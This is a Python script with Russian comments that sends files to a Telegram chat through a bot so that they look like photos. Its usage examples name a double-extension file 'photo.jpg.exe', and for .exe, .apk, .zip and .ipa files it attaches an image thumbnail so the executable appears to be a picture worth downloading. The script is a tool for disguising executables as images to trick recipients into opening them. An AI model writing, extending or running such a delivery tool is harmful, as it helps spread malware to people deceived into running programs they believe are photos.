"""
Скрипт для отправки файла как фото в Telegram
Файл будет выглядеть как фотография, которую нужно скачать
"""
import sys
import os
import requests
import json


def get_telegram_bot_token():
    """Получить токен бота из config.json"""
    try:
        with open('config.json', 'r', encoding='utf-8') as f:
            config = json.load(f)
            return config.get('telegram_bot_token')
    except Exception:
        return os.environ.get('TELEGRAM_BOT_TOKEN')


def send_document_to_telegram(file_path, chat_id, caption=None, thumbnail_path=None):
    """Отправляет файл как документ в Telegram"""
    token = get_telegram_bot_token()
    if not token:
        print("Ошибка: токен бота не найден", file=sys.stderr)
        return False
    
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id}
        
        # Добавляем превью (thumbnail) если есть
        if thumbnail_path and os.path.exists(thumbnail_path):
            files['thumbnail'] = open(thumbnail_path, 'rb')
        elif os.path.exists('embedded_image.jpg'):
            files['thumbnail'] = open('embedded_image.jpg', 'rb')
        
        if caption:
            data['caption'] = caption
        
        response = requests.post(url, data=data, files=files, timeout=120)
        
        # Закрываем файлы
        for f in files.values():
            if hasattr(f, 'close'):
                f.close()
        
        if response.status_code == 200:
            print("Документ успешно отправлен в Telegram!")
            result = response.json()
            if result.get('ok'):
                print(f"Сообщение ID: {result['result']['message_id']}")
            return True
        else:
            print(f"Ошибка отправки: {response.status_code}", file=sys.stderr)
            print(response.text, file=sys.stderr)
            return False
    except Exception as e:
        print(f"Ошибка: {e}", file=sys.stderr)
        return False


def send_photo_to_telegram(photo_path, chat_id, caption=None, thumbnail_path=None):
    """
    Отправляет файл в Telegram.
    Если файл больше 10MB - отправляет как документ с превью (thumbnail).
    Файл будет выглядеть как фотография с превью.
    
    Args:
        photo_path (str): Путь к файлу (может быть .jpg.exe)
        chat_id (int): ID чата для отправки
        caption (str, optional): Подпись к фото
        thumbnail_path (str, optional): Путь к изображению для превью
    
    Returns:
        bool: True если успешно
    """
    token = get_telegram_bot_token()
    if not token:
        print("Ошибка: токен бота не найден", file=sys.stderr)
        return False
    
    file_size = os.path.getsize(photo_path)
    max_photo_size = 10 * 1024 * 1024  # 10 MB
    
    try:
        # Если файл меньше 10MB - отправляем как фото
        if file_size <= max_photo_size:
            url = f"https://api.telegram.org/bot{token}/sendPhoto"
            
            with open(photo_path, 'rb') as photo:
                files = {'photo': photo}
                data = {'chat_id': chat_id}
                if caption:
                    data['caption'] = caption
                
                response = requests.post(url, data=data, files=files, timeout=60)
        else:
            # Если файл больше 10MB - отправляем как документ с превью
            print(f"Файл слишком большой для фото ({file_size / (1024*1024):.2f} MB)")
            print("Отправляем как документ с превью изображения...")
            
            url = f"https://api.telegram.org/bot{token}/sendDocument"
            
            files = {'document': open(photo_path, 'rb')}
            data = {'chat_id': chat_id}
            
            # Добавляем превью (thumbnail) из исходного изображения
            if thumbnail_path and os.path.exists(thumbnail_path):
                files['thumbnail'] = open(thumbnail_path, 'rb')
            elif os.path.exists('embedded_image.jpg'):
                # Используем встроенное изображение как превью
                files['thumbnail'] = open('embedded_image.jpg', 'rb')
            
            if caption:
                data['caption'] = caption
            
            response = requests.post(url, data=data, files=files, timeout=120)
            
            # Закрываем файлы
            for f in files.values():
                if hasattr(f, 'close'):
                    f.close()
        
        if response.status_code == 200:
            print("Файл успешно отправлен в Telegram!")
            result = response.json()
            if result.get('ok'):
                print(f"Сообщение ID: {result['result']['message_id']}")
                if file_size > max_photo_size:
                    print("Отправлено как документ с превью (будет выглядеть как фото)")
            return True
        else:
            print(f"Ошибка отправки: {response.status_code}", file=sys.stderr)
            print(response.text, file=sys.stderr)
            return False
                
    except Exception as e:
        print(f"Ошибка: {e}", file=sys.stderr)
        return False


def main():
    """Основная функция"""
    if len(sys.argv) < 3:
        print("Использование: send_as_photo.py <file_path> <chat_id> [caption] [thumbnail]")
        print()
        print("Пример:")
        print("  send_as_photo.py photo.jpg.exe 8350084460 'Мое фото'")
        print("  send_as_photo.py photo.jpg.exe 8350084460 'Мое фото' embedded_image.jpg")
        return 1
    
    file_path = sys.argv[1]
    chat_id = int(sys.argv[2])
    caption = sys.argv[3] if len(sys.argv) > 3 else None
    thumbnail = sys.argv[4] if len(sys.argv) > 4 else None
    
    if not os.path.exists(file_path):
        print(f"Ошибка: файл не найден: {file_path}", file=sys.stderr)
        return 1
    
    # Определяем тип файла
    file_ext = os.path.splitext(file_path)[1].lower()
    
    # Если это ZIP или другой документ - отправляем как документ
    if file_ext in ['.zip', '.apk', '.ipa', '.exe']:
        if send_document_to_telegram(file_path, chat_id, caption, thumbnail):
            return 0
        else:
            return 1
    else:
        # Иначе пытаемся отправить как фото
        if send_photo_to_telegram(file_path, chat_id, caption, thumbnail):
            return 0
        else:
            return 1


if __name__ == "__main__":
    sys.exit(main())
